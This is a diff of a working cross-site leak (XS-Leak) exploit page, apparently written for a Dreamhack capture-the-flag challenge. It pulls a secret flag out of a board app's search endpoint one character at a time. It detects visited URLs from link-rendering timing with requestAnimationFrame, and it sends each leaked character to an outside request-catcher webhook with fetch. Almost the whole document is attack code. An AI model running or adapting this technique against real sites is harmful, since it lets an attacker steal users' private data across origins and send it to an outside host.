@@ -1,180 +1,188 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>XS-Leak Exploit - Secret Board</title>
+  <title>XS-Leak Exploit v2</title>
   <style>
-    #status {
-      font-family: monospace;
-      font-size: 16px;
-      padding: 20px;
-      white-space: pre-wrap;
-    }
+    #status { font-family: monospace; font-size: 14px; padding: 20px; white-space: pre-wrap; }
+    #log { font-family: monospace; font-size: 12px; padding: 10px; max-height: 400px; overflow-y: auto; background: #f0f0f0; }
   </style>
 </head>
 <body>
-  <div id="status">Initializing exploit...</div>
+  <div id="status">Initializing...</div>
+  <div id="log"></div>
 
   <script>
-    // Configuration - CHANGE THESE
     const TARGET = "http://localhost:3000";
-    const WEBHOOK = "https://sixzggh.request.dreamhack.games"; // e.g., https://webhook.site/xxx or your server
-    const CHARSET = "0123456789ABCDEF}";
+    const WEBHOOK = "https://bbgacha.request.dreamhack.games";
+    const CHARSET = "ABCDEF0123456789}";
     const FLAG_PREFIX = "DH{";
-    const GARBAGE_TEXT = "X".repeat(1000); // Heavy text for rendering
+    const GARBAGE = "X".repeat(2000);
 
     let leaked = FLAG_PREFIX;
     let popup = null;
-    let controlTicks = 0;
 
     function log(msg) {
-      const el = document.getElementById("status");
-      el.textContent = msg;
+      document.getElementById("status").textContent = msg;
       console.log(msg);
+    }
+
+    function addLog(msg) {
+      const el = document.getElementById("log");
+      el.textContent += msg + "\n";
+      el.scrollTop = el.scrollHeight;
     }
 
     function sleep(ms) {
       return new Promise(r => setTimeout(r, ms));
     }
 
-    // Visit URL in popup - 200 response goes to history, 404 doesn't
-    async function visitUrl(url) {
+    async function visit(url) {
       if (!popup || popup.closed) {
-        popup = window.open("about:blank", "leakwin");
+        popup = window.open("about:blank", "w");
       }
       popup.location = url;
-      await sleep(800); // Wait for navigation and history update
+      await sleep(800);
     }
 
-    // Measure rendering ticks using requestAnimationFrame oscillation technique
-    async function measureTicks(url) {
+    function measure(url) {
       return new Promise((resolve) => {
-        const basisUrl = "https://" + Math.random() + ".invalid/" + Date.now();
-
-        // Create link with heavy rendering CSS
+        const basis = "https://x" + Math.random() + ".invalid/";
         const link = document.createElement('a');
         link.style.cssText = `
-          filter: contrast(200%) drop-shadow(16px 16px 10px #fefefe) saturate(200%);
-          transform: perspective(100px) rotateY(37deg);
-          position: absolute;
-          left: -9999px;
+          filter: drop-shadow(0 0 10px red) contrast(150%) saturate(150%);
+          transform: perspective(50px) rotateY(30deg);
+          text-shadow: 0 0 10px blue;
+          position: fixed; left: -9999px;
         `;
-        link.appendChild(document.createTextNode(GARBAGE_TEXT));
-        link.href = basisUrl;
+        link.textContent = GARBAGE;
+        link.href = basis;
         document.body.appendChild(link);
 
-        let tickCount = 0;
-        let tickRequestId;
-        let isPointingToBasisUrl = true;
+        let ticks = 0;
+        let rafId;
+        let flip = true;
 
-        // Oscillate href between target and basis URL
-        const oscillate = setInterval(() => {
-          link.href = isPointingToBasisUrl ? url : basisUrl;
-          isPointingToBasisUrl = !isPointingToBasisUrl;
+        const osc = setInterval(() => {
+          link.href = flip ? url : basis;
+          flip = !flip;
         }, 0);
 
-        // Count animation frames
-        const countTicks = () => {
-          tickCount++;
-          tickRequestId = requestAnimationFrame(countTicks);
-        };
-        tickRequestId = requestAnimationFrame(countTicks);
+        const count = () => { ticks++; rafId = requestAnimationFrame(count); };
+        rafId = requestAnimationFrame(count);
 
-        // Stop after measurement period
         setTimeout(() => {
-          clearInterval(oscillate);
-          cancelAnimationFrame(tickRequestId);
+          clearInterval(osc);
+          cancelAnimationFrame(rafId);
           link.remove();
-          resolve(tickCount);
+          resolve(ticks);
         }, 200);
       });
     }
 
-    // Get baseline tick count for unvisited URL
-    async function getControlTicks() {
-      const unvisitedUrl = "https://" + Math.random() + ".invalid/control";
-      const ticks = await measureTicks(unvisitedUrl);
-      return ticks;
-    }
+    // Test a single character and return its tick count
+    async function testOne(char) {
+      const query = leaked + char;
+      const url = `${TARGET}/posts/search?query=${encodeURIComponent(query)}`;
 
-    // Check if URL returns 200 (visited) or 404 (not visited)
-    async function checkUrl(url) {
-      // Navigate popup to URL - adds to history if 200
-      await visitUrl(url);
+      await visit(url);
       await sleep(200);
 
-      // Measure rendering ticks
-      const ticks = await measureTicks(url);
+      // Take 3 measurements and use minimum
+      let minTicks = Infinity;
+      for (let i = 0; i < 3; i++) {
+        const t = await measure(url);
+        if (t < minTicks) minTicks = t;
+        await sleep(30);
+      }
 
-      // Visited links render faster (fewer ticks)
-      // Threshold: if ratio < 0.7, it's visited (200)
-      const ratio = ticks / controlTicks;
-      console.log(`URL: ${url}, Ticks: ${ticks}, Control: ${controlTicks}, Ratio: ${ratio.toFixed(3)}`);
-
-      return ratio < 0.8; // Visited = fewer ticks = lower ratio
+      return { char, ticks: minTicks, url };
     }
 
+    // Find character with LOWEST tick count (most "visited")
     async function findNextChar() {
+      const results = [];
+
+      // Also test a baseline (definitely unvisited)
+      const baseUrl = `${TARGET}/posts/search?query=${encodeURIComponent(leaked + "ZZZZNOTEXIST")}`;
+      await visit(baseUrl);
+      await sleep(200);
+      let baseTicks = Infinity;
+      for (let i = 0; i < 3; i++) {
+        const t = await measure(baseUrl);
+        if (t < baseTicks) baseTicks = t;
+        await sleep(30);
+      }
+      addLog(`Baseline (404): ${baseTicks} ticks`);
+
       for (const char of CHARSET) {
-        const testQuery = leaked + char;
-        const url = `${TARGET}/posts/search?query=${encodeURIComponent(testQuery)}`;
-
-        log(`Testing: ${testQuery}\nLeaked so far: ${leaked}`);
-
-        const isMatch = await checkUrl(url);
-
-        if (isMatch) {
-          return char;
-        }
-
+        log(`Testing: ${leaked + char}`);
+        const result = await testOne(char);
+        results.push(result);
+        addLog(`'${char}': ${result.ticks} ticks (ratio: ${(result.ticks/baseTicks).toFixed(3)})`);
         await sleep(100);
       }
+
+      // Sort by ticks (ascending) - lowest = most visited
+      results.sort((a, b) => a.ticks - b.ticks);
+
+      // The correct character should have significantly lower ticks than baseline
+      const best = results[0];
+      const secondBest = results[1];
+      const ratio = best.ticks / baseTicks;
+
+      addLog(`\nBest: '${best.char}' = ${best.ticks}, Second: '${secondBest.char}' = ${secondBest.ticks}`);
+      addLog(`Ratio to baseline: ${ratio.toFixed(3)}`);
+
+      // If best is significantly better than second best AND better than baseline
+      if (ratio < 0.85 && best.ticks < secondBest.ticks * 0.9) {
+        return best.char;
+      }
+
+      // Fallback: just return the best if it's clearly better than baseline
+      if (ratio < 0.75) {
+        return best.char;
+      }
+
+      addLog("No clear winner found");
       return null;
     }
 
     async function exploit() {
-      log("Starting XS-Leak HTTP Status Code attack...\nCalibrating...");
+      log("Starting XS-Leak attack v2...");
+      addLog("Using comparative method - finding char with lowest ticks\n");
 
-      // Get baseline control ticks
-      controlTicks = await getControlTicks();
-      log(`Control ticks: ${controlTicks}\nStarting character brute-force...`);
-
-      // Verify prefix first
+      // Verify prefix works
       const prefixUrl = `${TARGET}/posts/search?query=${encodeURIComponent(FLAG_PREFIX)}`;
-      await visitUrl(prefixUrl);
-      const prefixTicks = await measureTicks(prefixUrl);
-      log(`Prefix test - Ticks: ${prefixTicks}, Ratio: ${(prefixTicks/controlTicks).toFixed(3)}`);
-
+      await visit(prefixUrl);
       await sleep(500);
+      const prefixTicks = await measure(prefixUrl);
+      addLog(`Prefix 'DH{' ticks: ${prefixTicks}\n`);
 
-      while (!leaked.endsWith("}")) {
+      while (!leaked.endsWith("}") && leaked.length < 50) {
+        addLog(`\n--- Finding char #${leaked.length + 1} ---`);
         const nextChar = await findNextChar();
 
         if (nextChar === null) {
-          log(`Could not find next character.\nLeaked: ${leaked}`);
-          // Send partial result
-          sendToWebhook(leaked);
+          log(`Stuck at: ${leaked}`);
           break;
         }
 
         leaked += nextChar;
-        log(`Found: ${nextChar}\nLeaked: ${leaked}`);
+        log(`FOUND: ${leaked}`);
+        addLog(`\n>>> LEAKED: ${leaked}\n`);
+        sendWebhook(leaked);
 
-        // Send progress to webhook
-        sendToWebhook(leaked);
-
-        if (nextChar === "}") {
-          log(`\n=== FLAG FOUND ===\n${leaked}`);
-          break;
-        }
-
-        await sleep(300);
+        await sleep(500);
       }
+
+      log(`\n=== FINAL: ${leaked} ===`);
     }
 
-    function sendToWebhook(data) {
+    function sendWebhook(data) {
       if (WEBHOOK === "YOUR_WEBHOOK_URL") return;
       fetch(`${WEBHOOK}?flag=${encodeURIComponent(data)}`, { mode: 'no-cors' }).catch(() => {});
     }
+
     window.onload = () => setTimeout(exploit, 500);
   </script>
 </body>
